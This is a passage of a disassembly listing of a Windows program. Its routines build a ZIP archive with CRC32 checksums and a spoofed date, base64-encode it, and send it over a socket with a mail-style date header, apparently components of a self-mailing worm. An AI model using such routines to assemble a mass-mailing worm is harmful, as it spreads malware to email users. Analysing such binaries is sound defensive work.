loc_401661:				; CODE XREF: sub_40156C+B2j
					; sub_40156C+E1j ...
		test	esi, esi
		jz	short loc_40166C
		push	esi		; hMem
		call	ds:GlobalFree

loc_40166C:				; CODE XREF: sub_40156C+F7j
		test	ebx, ebx
		jz	short loc_401677
		push	ebx		; hMem
		call	ds:GlobalFree

loc_401677:				; CODE XREF: sub_40156C+102j
		test	edi, edi
		pop	edi
		pop	esi
		pop	ebx
		jle	short loc_40168D
		lea	eax, [ebp+var_808]
		push	eax
		call	sub_401335
		pop	ecx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40168D:				; CODE XREF: sub_40156C+110j
		xor	eax, eax
		leave
		retn
sub_40156C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401691	proc near		; CODE XREF: sub_401A6D+53p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_4]
		test	edx, edx
		jnz	short loc_40169F
		xor	eax, eax
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40169F:				; CODE XREF: sub_401691+8j
		mov	eax, [ebp+arg_0]
		push	ebx
		push	esi
		mov	esi, [ebp+arg_8]
		cmp	esi, 8
		push	edi
		not	eax
		mov	ecx, 0FFh
		jl	loc_401789
		mov	edi, esi
		shr	edi, 3
		mov	ebx, edi
		neg	ebx
		lea	esi, [esi+ebx*8]
		mov	[ebp+arg_8], esi

loc_4016C7:				; CODE XREF: sub_401691+EFj
		movzx	ebx, byte ptr [edx]
		mov	esi, eax
		and	esi, ecx
		xor	esi, ebx
		mov	ebx, eax
		shr	ebx, 8
		mov	eax, ds:dword_406190[esi*4]
		xor	eax, ebx
		inc	edx
		mov	esi, eax
		movzx	ebx, byte ptr [edx]
		and	esi, ecx
		xor	esi, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	esi, ds:dword_406190[esi*4]
		shr	eax, 8
		xor	esi, eax
		inc	edx
		mov	eax, esi
		and	eax, ecx
		xor	eax, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	eax, ds:dword_406190[eax*4]
		shr	esi, 8
		xor	eax, esi
		inc	edx
		mov	esi, eax
		and	esi, ecx
		xor	esi, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	esi, ds:dword_406190[esi*4]
		shr	eax, 8
		xor	esi, eax
		inc	edx
		mov	eax, esi
		and	eax, ecx
		xor	eax, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	eax, ds:dword_406190[eax*4]
		shr	esi, 8
		xor	eax, esi
		inc	edx
		mov	esi, eax
		and	esi, ecx
		xor	esi, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	esi, ds:dword_406190[esi*4]
		shr	eax, 8
		xor	esi, eax
		inc	edx
		mov	eax, esi
		and	eax, ecx
		xor	eax, ebx
		movzx	ebx, byte ptr [edx+1]
		mov	eax, ds:dword_406190[eax*4]
		shr	esi, 8
		xor	eax, esi
		inc	edx
		mov	esi, eax
		and	esi, ecx
		xor	esi, ebx
		shr	eax, 8
		mov	esi, ds:dword_406190[esi*4]
		xor	eax, esi
		inc	edx
		dec	edi
		jnz	loc_4016C7
		mov	esi, [ebp+arg_8]

loc_401789:				; CODE XREF: sub_401691+21j
		test	esi, esi
		jz	short loc_4017A6

loc_40178D:				; CODE XREF: sub_401691+113j
		movzx	ebx, byte ptr [edx]
		mov	edi, eax
		and	edi, ecx
		xor	edi, ebx
		shr	eax, 8
		mov	edi, ds:dword_406190[edi*4]
		xor	eax, edi
		inc	edx
		dec	esi
		jnz	short loc_40178D

loc_4017A6:				; CODE XREF: sub_401691+FAj
		pop	edi
		pop	esi
		not	eax
		pop	ebx
		pop	ebp
		retn
sub_401691	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4017AD	proc near		; CODE XREF: sub_401E62+497p

var_474		= dword	ptr -474h
NumberOfBytesWritten= dword ptr	-74h
var_70		= dword	ptr -70h
var_6C		= word ptr -6Ch
var_6A		= word ptr -6Ah
var_68		= word ptr -68h
var_66		= word ptr -66h
var_64		= word ptr -64h
var_62		= word ptr -62h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= word ptr -54h
var_52		= word ptr -52h
var_4C		= word ptr -4Ch
var_4A		= dword	ptr -4Ah
var_46		= dword	ptr -46h
Buffer		= dword	ptr -40h
var_3C		= word ptr -3Ch
var_3A		= word ptr -3Ah
var_38		= word ptr -38h
var_36		= dword	ptr -36h
var_2E		= dword	ptr -2Eh
var_2A		= dword	ptr -2Ah
var_26		= word ptr -26h
var_24		= word ptr -24h
var_20		= dword	ptr -20h
var_1C		= word ptr -1Ch
var_1A		= word ptr -1Ah
var_18		= word ptr -18h
var_16		= word ptr -16h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= word ptr -0Ch
var_8		= dword	ptr -8
hFile		= dword	ptr -4
nNumberOfBytesToWrite= dword ptr  8
hObject		= dword	ptr  0Ch
lpString	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 474h
		push	ebx
		push	esi
		push	edi
		xor	esi, esi
		mov	edi, 80h
		push	esi		; hTemplateFile
		mov	ebx, ds:CreateFileA
		push	edi		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+nNumberOfBytesToWrite] ; lpFileName
		call	ebx ; CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFile], eax
		jz	loc_4019E0
		cmp	eax, esi
		jz	loc_4019E0
		push	esi		; hTemplateFile
		push	edi		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+hObject]	; lpFileName
		call	ebx ; CreateFileA
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		mov	[ebp+hObject], edi
		jz	loc_4019DB
		cmp	edi, esi
		jz	loc_4019DB
		push	1Eh		; size_t
		lea	eax, [ebp+Buffer]
		push	esi		; int
		push	eax		; void *
		call	_memset
		push	2Eh		; size_t
		lea	eax, [ebp+var_70]
		push	esi		; int
		push	eax		; void *
		call	_memset
		push	16h		; size_t
		lea	eax, [ebp+var_20]
		push	esi		; int
		push	eax		; void *
		call	_memset
		lea	eax, [ebp+var_36+2]
		mov	[ebp+Buffer], 4034B50h
		push	eax
		lea	eax, [ebp+var_36]
		push	eax
		mov	[ebp+var_3C], 0Ah
		mov	[ebp+var_6A], 0Ah
		mov	[ebp+var_3A], si
		mov	[ebp+var_68], si
		mov	[ebp+var_38], si
		mov	[ebp+var_66], si
		call	sub_4019E8
		mov	ax, word ptr [ebp+var_36]
		push	[ebp+hFile]
		mov	[ebp+var_64], ax
		mov	ax, word ptr [ebp+var_36+2]
		mov	[ebp+var_62], ax
		call	sub_401A6D
		mov	ebx, ds:GetFileSize
		add	esp, 30h
		mov	[ebp-32h], eax
		mov	[ebp+var_60], eax
		push	esi		; lpFileSizeHigh
		push	[ebp+hFile]	; hFile
		call	ebx ; GetFileSize
		push	esi		; lpFileSizeHigh
		mov	[ebp+var_2E], eax
		push	[ebp+hFile]	; hFile
		mov	[ebp+var_5C], eax
		call	ebx ; GetFileSize
		push	[ebp+lpString]	; lpString
		mov	ebx, ds:lstrlenA
		mov	[ebp+var_2A], eax
		mov	[ebp+var_58], eax
		call	ebx ; lstrlenA
		mov	[ebp+var_26], ax
		mov	[ebp+var_54], ax
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+Buffer]
		push	1Eh		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	edi		; hFile
		mov	edi, ds:WriteFile
		mov	[ebp+var_24], si
		mov	[ebp+var_52], si
		mov	[ebp+var_46], esi
		call	edi ; WriteFile
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	eax		; nNumberOfBytesToWrite
		push	[ebp+lpString]	; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		add	eax, 1Eh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		mov	[ebp+var_8], eax
		call	ds:SetFilePointer

loc_401901:				; CODE XREF: sub_4017AD+194j
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		lea	eax, [ebp+var_474]
		push	400h		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		mov	[ebp+nNumberOfBytesToWrite], esi
		call	ds:ReadFile
		test	eax, eax
		jz	short loc_401943
		cmp	[ebp+nNumberOfBytesToWrite], esi
		jz	short loc_401943
		lea	eax, [ebp+NumberOfBytesWritten]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_474]
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		mov	eax, [ebp+nNumberOfBytesToWrite]
		add	[ebp+var_8], eax
		jmp	short loc_401901
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401943:				; CODE XREF: sub_4017AD+173j
					; sub_4017AD+178j
		mov	eax, [ebp+var_8]
		push	esi		; lpOverlapped
		mov	[ebp+var_10], eax
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_70]
		push	2Eh		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		mov	[ebp+var_70], 2014B50h
		mov	[ebp+var_6C], 14h
		mov	[ebp+var_4C], si
		mov	[ebp+var_4A], 20h
		call	edi ; WriteFile
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		push	eax		; nNumberOfBytesToWrite
		push	[ebp+lpString]	; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+lpString]	; lpString
		call	ebx ; lstrlenA
		mov	ecx, [ebp+var_8]
		push	esi		; lpOverlapped
		mov	[ebp+var_20], 6054B50h
		mov	[ebp+var_1C], si
		lea	eax, [ecx+eax+2Eh]
		mov	[ebp+var_1A], si
		sub	eax, [ebp+var_10]
		mov	[ebp+var_18], 1
		mov	[ebp+var_16], 1
		mov	[ebp+var_C], si
		mov	[ebp+var_14], eax
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+var_20]
		push	16h		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	edi ; WriteFile
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle

loc_4019CE:				; CODE XREF: sub_4017AD+231j
		push	[ebp+hFile]	; hObject
		call	ds:CloseHandle
		mov	eax, esi
		jmp	short loc_4019E3
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019DB:				; CODE XREF: sub_4017AD+57j
					; sub_4017AD+5Fj
		push	2
		pop	esi
		jmp	short loc_4019CE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4019E0:				; CODE XREF: sub_4017AD+30j
					; sub_4017AD+38j
		push	1
		pop	eax

loc_4019E3:				; CODE XREF: sub_4017AD+22Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4017AD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4019E8	proc near		; CODE XREF: sub_4017AD+B4p

SystemTime	= _SYSTEMTIME ptr -10h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetSystemTime
		cmp	[ebp+SystemTime.wYear],	7CFh
		jb	short loc_401A08
		cmp	[ebp+SystemTime.wYear],	7DAh
		jbe	short loc_401A0E

loc_401A08:				; CODE XREF: sub_4019E8+16j
		mov	[ebp+SystemTime.wYear],	7D4h

loc_401A0E:				; CODE XREF: sub_4019E8+1Ej
		cmp	[ebp+SystemTime.wMonth], 1
		jb	short loc_401A1C
		cmp	[ebp+SystemTime.wMonth], 0Ch
		jbe	short loc_401A22

loc_401A1C:				; CODE XREF: sub_4019E8+2Bj
		mov	[ebp+SystemTime.wMonth], 1

loc_401A22:				; CODE XREF: sub_4019E8+32j
		cmp	[ebp+SystemTime.wDay], 1
		jb	short loc_401A30
		cmp	[ebp+SystemTime.wDay], 1Fh
		jbe	short loc_401A36

loc_401A30:				; CODE XREF: sub_4019E8+3Fj
		mov	[ebp+SystemTime.wDay], 0Ah

loc_401A36:				; CODE XREF: sub_4019E8+46j
		mov	eax, dword ptr [ebp+SystemTime.wYear]
		mov	ecx, dword ptr [ebp+SystemTime.wMonth]
		add	eax, 44h
		shl	eax, 9
		shl	ecx, 5
		or	eax, ecx
		mov	ecx, [ebp+arg_4]
		or	eax, dword ptr [ebp+SystemTime.wDay]
		mov	[ecx], ax
		mov	eax, dword ptr [ebp+SystemTime.wHour]
		mov	cx, [ebp+SystemTime.wSecond]
		shl	eax, 6
		or	eax, [ebp-6]
		shr	cx, 1
		shl	eax, 5
		or	eax, ecx
		mov	ecx, [ebp+arg_0]
		mov	[ecx], ax
		leave
		retn
sub_4019E8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401A6D	proc near		; CODE XREF: sub_4017AD+CCp

Buffer		= dword	ptr -408h
var_8		= dword	ptr -8
NumberOfBytesRead= dword ptr -4
hFile		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 408h
		push	ebx
		push	esi
		xor	esi, esi
		push	edi
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	ds:SetFilePointer
		mov	edi, ds:ReadFile
		lea	eax, [ebp+NumberOfBytesRead]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		mov	ebx, 400h
		lea	eax, [ebp+Buffer]
		push	ebx		; nNumberOfBytesToRead
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile
		mov	[ebp+var_8], esi
		mov	[ebp+NumberOfBytesRead], esi

loc_401AA8:				; CODE XREF: sub_401A6D+71j
		call	edi ; ReadFile
		test	eax, eax
		jz	short loc_401AE0
		cmp	[ebp+NumberOfBytesRead], esi
		jz	short loc_401AE0
		push	[ebp+NumberOfBytesRead]
		lea	eax, [ebp+Buffer]
		push	eax
		push	[ebp+var_8]
		call	sub_401691
		add	esp, 0Ch
		mov	[ebp+var_8], eax
		lea	eax, [ebp+NumberOfBytesRead]
		mov	[ebp+NumberOfBytesRead], esi
		push	esi
		push	eax
		lea	eax, [ebp+Buffer]
		push	ebx
		push	eax
		push	[ebp+hFile]
		jmp	short loc_401AA8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401AE0:				; CODE XREF: sub_401A6D+3Fj
					; sub_401A6D+44j
		push	esi		; dwMoveMethod
		push	esi		; lpDistanceToMoveHigh
		push	esi		; lDistanceToMove
		push	[ebp+hFile]	; hFile
		call	ds:SetFilePointer
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401A6D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401AF4	proc near		; CODE XREF: sub_401CB2+4Fp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		push	esi
		movzx	ecx, byte ptr [eax]
		shr	ecx, 2
		mov	dl, ds:byte_406594[ecx]
		mov	ecx, [esp+4+arg_4]
		mov	[ecx], dl
		mov	dl, [eax]
		movzx	esi, byte ptr [eax+1]
		and	edx, 3
		shl	edx, 4
		shr	esi, 4
		or	edx, esi
		cmp	[esp+4+arg_8], 1
		mov	dl, ds:byte_406594[edx]
		mov	[ecx+1], dl
		jle	short loc_401B46
		mov	dl, [eax+1]
		movzx	esi, byte ptr [eax+2]
		and	edx, 0Fh
		shl	edx, 2
		shr	esi, 6
		or	edx, esi
		mov	dl, ds:byte_406594[edx]
		jmp	short loc_401B48
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401B46:				; CODE XREF: sub_401AF4+36j
		mov	dl, 3Dh

loc_401B48:				; CODE XREF: sub_401AF4+50j
		cmp	[esp+4+arg_8], 2
		mov	[ecx+2], dl
		pop	esi
		jle	short loc_401B61
		mov	al, [eax+2]
		and	eax, 3Fh
		mov	al, ds:byte_406594[eax]
		jmp	short loc_401B63
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401B61:				; CODE XREF: sub_401AF4+5Dj
		mov	al, 3Dh

loc_401B63:				; CODE XREF: sub_401AF4+6Bj
		mov	[ecx+3], al
		retn
sub_401AF4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401B67	proc near		; CODE XREF: sub_401E62+5CBp

TimeZoneInformation= _TIME_ZONE_INFORMATION ptr	-108h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
SystemTime	= _SYSTEMTIME ptr -10h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		lea	eax, [ebp+SystemTime]
		mov	[ebp+var_2C], offset aSun ; "Sun"
		push	eax		; lpSystemTime
		mov	[ebp+var_28], offset aMon ; "Mon"
		mov	[ebp+var_24], offset aTue ; "Tue"
		mov	[ebp+var_20], offset aWed ; "Wed"
		mov	[ebp+var_1C], offset aThu ; "Thu"
		mov	[ebp+var_18], offset aFri ; "Fri"
		mov	[ebp+var_14], offset aSat ; "Sat"
		mov	[ebp+var_5C], offset aJan ; "Jan"
		mov	[ebp+var_58], offset aFeb ; "Feb"
		mov	[ebp+var_54], offset aMar ; "Mar"
		mov	[ebp+var_50], offset aApr ; "Apr"
		mov	[ebp+var_4C], offset aMay ; "May"
		mov	[ebp+var_48], offset aJun ; "Jun"
		mov	[ebp+var_44], offset aJul ; "Jul"
		mov	[ebp+var_40], offset aAug ; "Aug"
		mov	[ebp+var_3C], offset aSep ; "Sep"
		mov	[ebp+var_38], offset aOct ; "Oct"
		mov	[ebp+var_34], offset aNov ; "Nov"
		mov	[ebp+var_30], offset aDec ; "Dec"
		call	ds:GetLocalTime
		and	[ebp+TimeZoneInformation.Bias],	0
		lea	eax, [ebp+TimeZoneInformation]
		push	eax		; lpTimeZoneInformation
		call	ds:GetTimeZoneInformation
		mov	ecx, [ebp+TimeZoneInformation.Bias]
		cmp	eax, 2
		jnz	short loc_401C23
		mov	eax, [ebp+TimeZoneInformation.DaylightBias]
		add	ecx, eax

loc_401C23:				; CODE XREF: sub_401B67+B5j
		neg	ecx
		push	esi
		push	edi
		mov	esi, ecx
		jns	short loc_401C2D
		neg	esi

loc_401C2D:				; CODE XREF: sub_401B67+C2j
		cmp	[ebp+SystemTime.wDayOfWeek], 6
		jbe	short loc_401C3A
		mov	[ebp+SystemTime.wDayOfWeek], 6

loc_401C3A:				; CODE XREF: sub_401B67+CBj
		cmp	[ebp+SystemTime.wMonth], 0
		jnz	short loc_401C47
		mov	[ebp+SystemTime.wMonth], 1

loc_401C47:				; CODE XREF: sub_401B67+D8j
		cmp	[ebp+SystemTime.wMonth], 0Ch
		jbe	short loc_401C54
		mov	[ebp+SystemTime.wMonth], 0Ch

loc_401C54:				; CODE XREF: sub_401B67+E5j
		test	ecx, ecx
		mov	ecx, offset asc_40A8A0 ; "+"
		jge	short loc_401C62
		mov	ecx, offset asc_40A89C ; "-"

loc_401C62:				; CODE XREF: sub_401B67+F4j
		mov	eax, esi
		push	3Ch
		cdq
		pop	edi
		idiv	edi
		mov	eax, esi
		push	edx
		push	edi
		cdq
		pop	esi
		idiv	esi
		push	eax
		push	ecx
		movzx	eax, [ebp+SystemTime.wSecond]
		push	eax
		movzx	eax, [ebp+SystemTime.wMinute]
		push	eax
		movzx	eax, [ebp+SystemTime.wHour]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	[ebp+eax*4+TimeZoneInformation.DaylightBias]
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wDayOfWeek]
		push	[ebp+eax*4+var_2C]
		push	offset aSUSU_2u_2u_2uS ; LPCSTR
		push	[ebp+arg_0]	; LPSTR
		call	ds:wsprintfA
		add	esp, 30h
		pop	edi
		pop	esi
		leave
		retn
sub_401B67	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401CB2	proc near		; CODE XREF: sub_401E62+824p

buf		= byte ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
Buffer		= dword	ptr -4
hFile		= dword	ptr  8
s		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		and	[ebp+var_8], 0
		push	ebx
		mov	ebx, ds:send
		push	esi
		push	edi

loc_401CC5:				; CODE XREF: sub_401CB2+89j
					; sub_401CB2+AEj
		xor	edi, edi
		mov	[ebp+var_C], edi

loc_401CCA:				; CODE XREF: sub_401CB2+3Bj
		lea	esi, [ebp+edi+Buffer]
		push	1		; uBytes
		push	esi		; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:_lread
		test	eax, eax
		mov	[ebp+var_10], eax
		jz	short loc_401CE6
		inc	[ebp+var_C]
		jmp	short loc_401CE9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401CE6:				; CODE XREF: sub_401CB2+2Dj
		and	byte ptr [esi],	0

loc_401CE9:				; CODE XREF: sub_401CB2+32j
		inc	edi
		cmp	edi, 3
		jl	short loc_401CCA
		xor	edi, edi
		cmp	[ebp+var_C], edi
		jz	short loc_401D2A
		push	[ebp+var_C]
		lea	eax, [ebp+buf]
		push	eax
		lea	eax, [ebp+Buffer]
		push	eax
		call	sub_401AF4
		add	esp, 0Ch
		xor	esi, esi

loc_401D0B:				; CODE XREF: sub_401CB2+73j
		push	edi		; flags
		lea	eax, [ebp+esi+buf]
		push	1		; len
		push	eax		; buf
		push	[ebp+s]		; s
		call	ebx ; send
		cmp	eax, edi
		jz	short loc_401D6E
		cmp	eax, 0FFFFFFFFh
		jz	short loc_401D6E
		inc	esi
		cmp	esi, 4
		jl	short loc_401D0B
		inc	[ebp+var_8]

loc_401D2A:				; CODE XREF: sub_401CB2+42j
		mov	eax, [ebp+arg_8]
		push	4
		cdq
		pop	ecx
		idiv	ecx
		cmp	[ebp+var_8], eax
		jge	short loc_401D3F
		cmp	[ebp+var_10], edi
		jnz	short loc_401CC5
		xor	edi, edi

loc_401D3F:				; CODE XREF: sub_401CB2+84j
		cmp	[ebp+var_8], edi
		jz	short loc_401D5A
		push	edi		; flags
		push	2		; len
		push	offset buf	; buf
		push	[ebp+s]		; s
		call	ebx ; send
		cmp	eax, edi
		jz	short loc_401D6E
		cmp	eax, 0FFFFFFFFh
		jz	short loc_401D6E

loc_401D5A:				; CODE XREF: sub_401CB2+90j
		cmp	[ebp+var_10], edi
		mov	[ebp+var_8], edi
		jnz	loc_401CC5
		push	1
		pop	eax

loc_401D69:				; CODE XREF: sub_401CB2+BFj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401D6E:				; CODE XREF: sub_401CB2+68j
					; sub_401CB2+6Dj ...
		or	eax, 0FFFFFFFFh
		jmp	short loc_401D69
sub_401CB2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401D73	proc near		; CODE XREF: sub_401E62:loc_401F8Ep
					; sub_401E62+13Cp ...
		mov	eax, ds:dword_417C10
		imul	eax, 343FDh
		add	eax, 269EC3h
		mov	ds:dword_417C10, eax
		shr	eax, 10h
		and	eax, 7FFFh
		retn
sub_401D73	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401D91	proc near		; CODE XREF: WinMain(x,x,x,x)+11p

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	ds:dword_417C10, eax
		retn
sub_401D91	endp


